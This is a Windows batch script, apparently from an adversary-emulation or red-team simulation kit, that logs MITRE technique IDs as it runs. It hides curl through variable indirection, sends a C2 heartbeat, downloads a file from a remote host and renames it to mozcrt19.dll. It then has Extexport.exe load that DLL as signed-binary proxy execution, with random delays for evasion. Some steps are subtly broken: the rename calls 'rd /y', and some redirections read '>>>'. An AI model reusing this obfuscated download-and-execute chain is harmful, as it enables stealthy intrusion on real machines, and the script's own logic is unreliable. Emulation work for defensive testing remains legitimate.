@echo off
SETLOCAL EnableDelayedExpansion

REM Random variable names for PHR_ placeholders (never obfuscate these values)
SET yktnwwf=%APPDATA%\8236\f37691da
SET fpakbq=Macula-Stage0-8236
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8236-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=surfshark.txt
SET fpldhe=8236

REM Derived variables
SET logfile=%APPDATA%\!yydue!\macula-simulations.log
SET tempdir=%APPDATA%\!yydue!

REM Initialize TTP logging variables
SET ttp_result=0
SET ttp_error=
SET mitre_id=T1218
SET mitre_name=Signed Binary Proxy Execution

REM Obfuscated command components
SET a=c
SET b=u
SET c=r
SET d=l
SET e= -k
SET f= -s
SET g= -o
SET h= nul
SET i=Ex
SET j=tex
SET k=port
SET l=.e
SET m=xe
SET n=rd
SET o= /y
SET p=ren
SET q=mozc
SET r=rt1
SET s=9.d
SET t=ll
SET u=foo
SET v=bar

REM Build obfuscated commands through variable indirection
SET part1=!a!!b!!c!!d!
SET part2=!i!!j!!k!!l!!m!
SET curlcmd=!part1!!e!!f!!g!!h!
SET renamecmd=!n!!o!
SET targetdll=!q!!r!!s!!t!
SET exeargs=!u! !v!

REM Debug log: script start
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: script_start>>> "!logfile!" 2>nul

REM Initial random delay (30-60 seconds)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: initial_delay_start>>> "!logfile!" 2>nul
SET /A rdelay=%RANDOM% %% 31 + 30
timeout /t !rdelay! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: initial_delay_complete=!rdelay!s>>> "!logfile!" 2>nul

REM Create temp directory if it doesn't exist
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: directory_create_start=!tempdir!>>> "!logfile!" 2>nul
if not exist "!tempdir!" mkdir "!tempdir!" 2>nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: directory_create_complete>>> "!logfile!" 2>nul

REM Delay before heartbeat
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: pre_heartbeat_delay_start>>> "!logfile!" 2>nul
ping -n 5 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: pre_heartbeat_delay_complete>>> "!logfile!" 2>nul

REM 1. C2 HEARTBEAT (using obfuscated curl command)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_start=!rdzgrnne!>>> "!logfile!" 2>nul
!curlcmd! "!rdzgrnne!"
if !errorlevel! equ 0 (
    SET hb_result=1
) else (
    SET hb_result=0
)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_complete=!hb_result!>>> "!logfile!" 2>nul

REM Delay before download
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: pre_download_delay_start>>> "!logfile!" 2>nul
CHOICE /C Y /N /D Y /T 8 >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: pre_download_delay_complete>>> "!logfile!" 2>nul

REM 2. Download DLL from external server (T1105 - Ingress Tool Transfer)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: download_start=!repbmqg!/!edjwtl!>>> "!logfile!" 2>nul
SET ttp_result=0
SET ttp_error=
!part1!!e!!f! -o "!yktnwwf!\!edjwtl!" "!repbmqg!/!edjwtl!" 2>nul
if !errorlevel! equ 0 (
    SET ttp_result=1
    SET ttp_error=
) else (
    SET ttp_result=0
    SET ttp_error=connection_refused
)

REM Log T1105 execution
SET stamp=%DATE:~-4%-%DATE:~4,2%-%DATE:~7,2% %TIME%
echo [!stamp!][!omxgazu!]: !yydue!-!fpldhe!-T1105|Ingress Tool Transfer=!ttp_result!::!ttp_error!>> "!logfile!" 2>nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: download_complete=!ttp_result!>>> "!logfile!" 2>nul

REM Check if file was downloaded
if not exist "!yktnwwf!\!edjwtl!" (
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: download_failed=file_not_found>>> "!logfile!" 2>nul
    ENDLOCAL
    exit /b 1
)

REM Random delay between operations
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: random_delay_start>>> "!logfile!" 2>nul
SET /A delay=%RANDOM% %% 20 + 10
timeout /t !delay! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: random_delay_complete=!delay!s>>> "!logfile!" 2>nul

REM 3. Rename downloaded DLL to mozcrt19.dll
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: rename_start=!yktnwwf!\!edjwtl!>>> "!logfile!" 2>nul
!renamecmd! "!yktnwwf!\!edjwtl!" "!targetdll!" 2>nul
if !errorlevel! neq 0 (
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: rename_failed>>> "!logfile!" 2>nul
)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: rename_complete>>> "!logfile!" 2>nul

REM Delay before execution
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: pre_execution_delay_start>>> "!logfile!" 2>nul
ping -n 12 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: pre_execution_delay_complete>>> "!logfile!" 2>nul

REM 4. Execute Extexport.exe with the DLL (T1218 - Signed Binary Proxy Execution)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: execution_start=!part2! !exeargs!>>> "!logfile!" 2>nul
SET ttp_result=0
SET ttp_error=

REM Build execution command with variable indirection
SET exec1=!part2!
SET exec2=%CD%
SET exec3=!exeargs!
CALL SET exec_cmd=%%exec1%% %%exec2%% %%exec3%%

%exec_cmd% 2>nul
if !errorlevel! equ 0 (
    SET ttp_result=1
    SET ttp_error=
) else (
    SET ttp_result=0
    SET ttp_error=assembly_load_failed
)

REM Log T1218 execution
SET stamp=%DATE:~-4%-%DATE:~4,2%-%DATE:~7,2% %TIME%
echo [!stamp!][!omxgazu!]: !yydue!-!fpldhe!-!mitre_id!|!mitre_name!=!ttp_result!::!ttp_error!>> "!logfile!" 2>nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: execution_complete=!ttp_result!>>> "!logfile!" 2>nul

REM Final delay before exit
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: final_delay_start>>> "!logfile!" 2>nul
CHOICE /C Y /N /D Y /T 6 >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: final_delay_complete>>> "!logfile!" 2>nul

REM Cleanup if needed
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: cleanup_check>>> "!logfile!" 2>nul
if exist "!targetdll!" (
    del "!targetdll!" 2>nul
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: cleanup_performed>>> "!logfile!" 2>nul
)

echo [%DATE% %TIME%][DEBUG][!omxgazu!]: script_end>>> "!logfile!" 2>nul
ENDLOCAL